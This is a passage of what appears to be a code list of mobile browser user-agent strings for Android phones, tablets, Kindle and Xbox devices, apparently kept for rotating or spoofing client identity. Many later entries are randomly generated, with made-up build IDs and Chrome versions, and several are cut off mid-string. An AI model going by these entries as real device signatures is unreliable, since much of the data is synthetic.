'Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 10; MI 9 MIUI/V12.0.4.0.QFAMIXM)',
'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; pl-pl; Mi MIX 2S Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.10.0-gn',
'Mozilla/5.0 (Linux; Android 8.0.0; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A705FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 10; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX3363 Build/RKQ1.210408.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A226B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:103.0) Gecko/103.0 Firefox/103.0',
'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 11; M2007J20CG Build/RKQ1.200826.002)',
'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/103.0',
'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; pl-pl; Redmi Note 8T Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.5.1-gn',
'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobil',
'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobil',
'Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.6; fr-fr; Nexus One Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.7; fr-fr; Nexus One Build/GWK74) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; Nexus One Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edg',
'Mozilla/5.0 (Windows Phone 10.0; Android 10; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 Edge/',
'Mozilla/5.0 (Windows Phone 10.0; Android 7.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Ed',
'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge',
'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Ed',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/5',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWA Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/5',
'Dalvik/2.1.0 (Linux; U; Android 6; Vivo Build/M8RZRG) [FBAN/EMA;FBAV/221.0.0.80.42;FBBV/804773415;FBRV/0;FBPN/com.facebook.lite;FBLC/es_LA;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 11; Vivo Build/RQ1C.511176.012) [FBAN/EMA;FBAV/333.0.0.50.66;FBBV/782784529;FBRV/0;FBPN/com.facebook.lite;FBLC/fr_CA;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Vivo Build/TD1A.577457.031) [FBAN/EMA;FBAV/154.0.0.33.13;FBBV/450403804;FBRV/0;FBPN/com.facebook.lite;FBLC/el_GR;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 5; Vivo Build/LO7JMW) [FBAN/EMA;FBAV/148.0.0.19.38;FBBV/289968567;FBRV/0;FBPN/com.facebook.lite;FBLC/pl_PL;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 6; Vivo Build/M5I5II) [FBAN/EMA;FBAV/181.0.0.97.34;FBBV/148226085;FBRV/0;FBPN/com.facebook.lite;FBLC/fr_CA;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 5; Vivo Build/LWMQ1F) [FBAN/EMA;FBAV/158.0.0.63.36;FBBV/310397078;FBRV/0;FBPN/com.facebook.lite;FBLC/ca_ES;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/5;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 11; Vivo Build/RQ1A.637692.016) [FBAN/EMA;FBAV/125.0.0.41.34;FBBV/355600608;FBRV/0;FBPN/com.facebook.lite;FBLC/ne_NP;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 6; Vivo Build/MUG5HZ) [FBAN/EMA;FBAV/229.0.0.97.53;FBBV/308578414;FBRV/0;FBPN/com.facebook.lite;FBLC/hi_IN;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 8; Vivo Build/OPM2.692210.031) [FBAN/EMA;FBAV/235.0.0.43.73;FBBV/500818543;FBRV/0;FBPN/com.facebook.lite;FBLC/hi_IN;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/8;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 14; Vivo Build/TQ2A.183116.095) [FBAN/EMA;FBAV/235.0.0.77.98;FBBV/834741869;FBRV/0;FBPN/com.facebook.lite;FBLC/fr_CA;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 6; Vivo Build/MSCYCX) [FBAN/EMA;FBAV/445.0.0.95.58;FBBV/237130443;FBRV/0;FBPN/com.facebook.lite;FBLC/pt_BR;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 5; Vivo Build/LWMQZ3) [FBAN/EMA;FBAV/132.0.0.17.95;FBBV/374771144;FBRV/0;FBPN/com.facebook.lite;FBLC/ko_KR;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/5;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 5; Vivo Build/LQTYIZ) [FBAN/EMA;FBAV/208.0.0.94.36;FBBV/522286638;FBRV/0;FBPN/com.facebook.lite;FBLC/pl_PL;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 8; Vivo Build/OPR2.609089.030) [FBAN/EMA;FBAV/107.0.0.19.22;FBBV/841011084;FBRV/0;FBPN/com.facebook.lite;FBLC/it_IT;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/8;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 9; Vivo Build/PPR1.709072.060) [FBAN/EMA;FBAV/285.0.0.12.56;FBBV/226162060;FBRV/0;FBPN/com.facebook.lite;FBLC/fa_IR;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/9;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 5; Vivo Build/L0X851) [FBAN/EMA;FBAV/394.0.0.62.31;FBBV/858408382;FBRV/0;FBPN/com.facebook.lite;FBLC/ko_KR;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 10; Vivo Build/QQ3A.950206.052) [FBAN/EMA;FBAV/364.0.0.45.19;FBBV/490147910;FBRV/0;FBPN/com.facebook.lite;FBLC/da_DK;FBMF/4.0;FBBD/4.0;FBDV/Vivo;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Dalvik/2.1.0 (Linux; U; Android 4; Redmi Build/JYLXMP) [FBAN/EMA;FBAV/444.0.0.47.98;FBBV/596196555;FBRV/0;FBPN/com.facebook.lite;FBLC/zh_CN;FBMF/3.0;FBBD/3.0;FBDV/Redmi;FBSV/4;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Mozilla/5.0 (Linux; Android 6; Tecno Build/MXU35P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.3782.139 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/158.0.0.17.61;]',
'Mozilla/5.0 (Linux; Android 6; Tecno Build/MW8I7M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.2163.215 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.75.45;]',
'Mozilla/5.0 (Linux; Android 11; Tecno Build/RD2A.910366.095; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.7289.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/443.0.0.18.45;]',
'Mozilla/5.0 (Linux; Android 5; Tecno Build/LR1JSJ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.8845.484 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/164.0.0.92.55;]',
'Mozilla/5.0 (Linux; Android 10; Tecno Build/QQ1B.418122.067; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.8936.919 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.71.28;]',
'Mozilla/5.0 (Linux; Android 13; Tecno Build/TP1A.417211.083; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5767.514 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/140.0.0.88.19;]',
'Mozilla/5.0 (Linux; Android 7; Tecno Build/N4E0HH; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.3949.476 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/202.0.0.34.78;]',
'Mozilla/5.0 (Linux; Android 9; Tecno Build/PD2A.367563.078; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.7200.958 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/123.0.0.56.74;]',
'Mozilla/5.0 (Linux; Android 12; Tecno Build/SD2A.616792.068; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.9061.861 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/188.0.0.26.57;]',
'Mozilla/5.0 (Linux; Android 9; Tecno Build/PQ1A.949544.094; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.4526.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.98.14;]',
'Mozilla/5.0 (Linux; Android 4; Tecno Build/JG7M29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.9883.505 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.91.13;]',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; Android 11; Infinix Build/RQ1C.599191.088; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.6611.530 Mobile Safari/537.36 [FBAN/EMA;FBLC/ko_KR;FBAV/144.0.0.19.13;]',
'Mozilla/5.0 (Linux; Android 14; Infinix Build/TQ1A.851782.056; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.8630.512 Mobile Safari/537.36 [FBAN/EMA;FBLC/bn_IN;FBAV/236.0.0.41.96;]',
'Mozilla/5.0 (Linux; Android 11; Infinix Build/RQ1A.145907.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.8360.646 Mobile Safari/537.36 [FBAN/EMA;FBLC/pt_BR;FBAV/295.0.0.79.81;]',
'Mozilla/5.0 (Linux; Android 5; Infinix Build/LJBJL5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.6359.594 Mobile Safari/537.36 [FBAN/EMA;FBLC/bs_BA;FBAV/212.0.0.42.59;]',
'Mozilla/5.0 (Linux; Android 9; Infinix Build/PPR2.184744.040; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.1142.389 Mobile Safari/537.36 [FBAN/EMA;FBLC/th_TH;FBAV/234.0.0.80.58;]',
'Mozilla/5.0 (Linux; Android 12; Infinix Build/SQ1A.120567.048; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.1912.439 Mobile Safari/537.36 [FBAN/EMA;FBLC/as_IN;FBAV/360.0.0.93.50;]',
'Mozilla/5.0 (Linux; Android 10; Infinix Build/QQ1C.907326.035; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.9894.186 Mobile Safari/537.36 [FBAN/EMA;FBLC/bs_BA;FBAV/309.0.0.10.67;]',
'Mozilla/5.0 (Linux; Android 6; Infinix Build/M2RMN7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.1605.899 Mobile Safari/537.36 [FBAN/EMA;FBLC/pt_BR;FBAV/245.0.0.57.57;]',
'Mozilla/5.0 (Linux; Android 4; Infinix Build/JLWMAE; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.7267.677 Mobile Safari/537.36 [FBAN/EMA;FBLC/ms_MY;FBAV/120.0.0.68.90;]',
'Mozilla/5.0 (Linux; Android 9; Infinix Build/PQ3A.573196.064; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.9673.956 Mobile Safari/537.36 [FBAN/EMA;FBLC/pl_PL;FBAV/149.0.0.92.83;]',
'Mozilla/5.0 (Linux; Android 12; Infinix Build/SQ1A.728498.095; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.8977.994 Mobile Safari/537.36 [FBAN/EMA;FBLC/ro_RO;FBAV/281.0.0.22.39;]',
'Mozilla/5.0 (Linux; Android 8; Infinix Build/OPR4.140517.095; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.8288.253 Mobile Safari/537.36 [FBAN/EMA;FBLC/bn_IN;FBAV/164.0.0.65.32;]',
'Mozilla/5.0 (Linux; Android 11; Infinix Build/RQ1C.574911.062; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.3213.741 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/226.0.0.72.25;]',
'Mozilla/5.0 (Linux; Android 7; Infinix Build/N9N7PU; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5223.807 Mobile Safari/537.36 [FBAN/EMA;FBLC/bs_BA;FBAV/178.0.0.75.29;]',
'Mozilla/5.0 (Linux; Android 8; Infinix Build/OPM7.871162.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.5002.201 Mobile Safari/537.36 [FBAN/EMA;FBLC/bs_BA;FBAV/291.0.0.57.68;]',
'Mozilla/5.0 (Linux; Android 12; Infinix Build/SQ1D.244376.029; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.5686.253 Mobile Safari/537.36 [FBAN/EMA;FBLC/as_IN;FBAV/318.0.0.26.59;]',
'Mozilla/5.0 (Linux; Android 12; Infinix Build/SD2A.611516.031; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.7583.175 Mobile Safari/537.36 [FBAN/EMA;FBLC/fi_FI;FBAV/183.0.0.22.15;]',
'Mozilla/5.0 (Linux; Android 7; Infinix Build/N8JG7K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.5944.463 Mobile Safari/537.36 [FBAN/EMA;FBLC/bg_BG;FBAV/193.0.0.52.77;]',
'Mozilla/5.0 (Linux; Android 6; Infinix Build/MBTWF4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.7927.739 Mobile Safari/537.36 [FBAN/EMA;FBLC/bn_IN;FBAV/207.0.0.62.96;]',
'Mozilla/5.0 (Linux; Android 9; Infinix Build/PD2A.488088.084; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.3713.458 Mobile Safari/537.36 [FBAN/EMA;FBLC/ro_RO;FBAV/299.0.0.24.19;]',
'Mozilla/5.0 (Linux; Android 14; Infinix Build/TP1A.233583.098; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.1471.778 Mobile Safari/537.36 [FBAN/EMA;FBLC/bn_IN;FBAV/359.0.0.53.21;]',
'Mozilla/5.0 (Linux; Android 5; Infinix Build/LGYFR8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.4944.593 Mobile Safari/537.36 [FBAN/EMA;FBLC/fr_CA;FBAV/313.0.0.22.25;]',
'Mozilla/5.0 (Linux; Android 8; Infinix Build/OPR2.538121.084; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5075.403 Mobile Safari/537.36 [FBAN/EMA;FBLC/pl_PL;FBAV/140.0.0.37.49;]',
'Mozilla/5.0 (Linux; Android 8; Infinix Build/OPR5.555776.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2417.745 Mobile Safari/537.36 [FBAN/EMA;FBLC/da_DK;FBAV/195.0.0.57.60;]',
